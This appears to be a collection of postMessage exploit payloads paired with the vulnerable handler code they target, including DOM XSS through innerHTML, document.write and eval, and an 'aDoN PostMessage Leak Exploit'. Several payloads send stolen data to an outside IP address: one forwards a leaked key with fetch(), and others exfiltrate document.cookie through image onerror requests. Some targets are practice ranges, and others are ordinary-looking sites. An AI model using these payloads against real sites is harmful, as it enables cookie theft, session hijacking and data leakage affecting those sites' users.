DOM XSS Payload 1:


<html>
<body>
<script>
var popup = window.open('http://vulnerable.com');
function post(){popup.postMessage({"id":0,"value":"<img src='x' onerror='alert(document.domain)'>"},"*")}
setInterval(post,1000);
</script>
</body>
</html>



Vulnerable Code:


<script>window.addEventListener("message", function(event){
       document.getElementById("value"+event.data.id).innerHTML = event.data.value;}, false);
 </script>
            
           
<span id="value0">
  blablabla
</span>




-----------------------------------------------------------------

Info Leak Payload:


<html>
<head>
  <script>

      pwn = window.open('http://vulnerable.com/key/0')

      window.addEventListener('message', (event) => {
      
	fetch("http://37.187.112.19:8000/"+event.data.value, { method: 'GET'});
      }, false)

  </script>
</head>
<body>
  <p>aDoN PostMessage Leak Exploit</p>
</body>
</html>




Vulnerable Code:


<html>
<script>
  window.opener.postMessage({"id":0,"value":"21939129iie9r"}, '*');
  window.close();
</script>
</html>



----------------------------------------------------------------

DOM XSS Payload 2 (window)


<html>
<body>
<script>

var pwn = window.open("http://willifox.com/");

setTimeout(function(){
pwn.postMessage("<img src='x' onerror=this.src='http://37.187.112.29:8000?c='+document.cookie>","*");
}, 3000);


</script>
</body>
</html>

----------------------------------------------------------------


DOM XSS Payload 3 (iframe):

<html>
<body>
  <iframe id="myiframe" src="http://ptl-de18fbd5-3a50f909.libcurl.so/"></iframe>
<script>
pwn = document.getElementById('myiframe').contentWindow
setTimeout(function(){pwn.postMessage("<img src='x' onerror=this.src='http://37.187.112.19:8000?c='+document.cookie>", "*");},2000);
  // Call to postMessage using a reference to myiframe 
</script>
</body>
</html>


------------------------------------------------------------------------

Vulnerable Code:

<html>
  <head><title>Toxic DOM</title></head>
  <body>
    <script>
      const postMessageHandler = function(msg) {
  let action = msg.data.action;
  if(action === 'exec') {
    eval(msg.data.payload);
  } else if (action === 'addImage') {
    document.write('<img href='+ msg.data.source + '>');
  } else if (action === 'addHtml') {
    document.write(msg.data.html);
  } else {
    console.debug('unsupported command');
  }
};

window.addEventListener('message', postMessageHandler, false);

    </script>
  </body>
  
  
--- Payload 1:  ---
  
<script>

var pwn = window.open("http://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval")

setTimeout(function(){pwn.postMessage({"action":"exec", "payload":"alert(document.domain)"},"*")},2000);

</script>
  
  
--- Payload 2: ---


<script>

var pwn = window.open("http://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval")


setTimeout(function(){pwn.postMessage({"action":"addImage", "source":"<img src='x' onerror='alert(document.domain)'>"},"*")},2000);

</script>
  
  
--- Payload 3: ---
  
 <script>

var pwn = window.open("http://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval")


setTimeout(function(){pwn.postMessage({"action":"addHtml", "html":"<img src='x' onerror='alert(document.domain)'>"},"*")},2000);

</script>

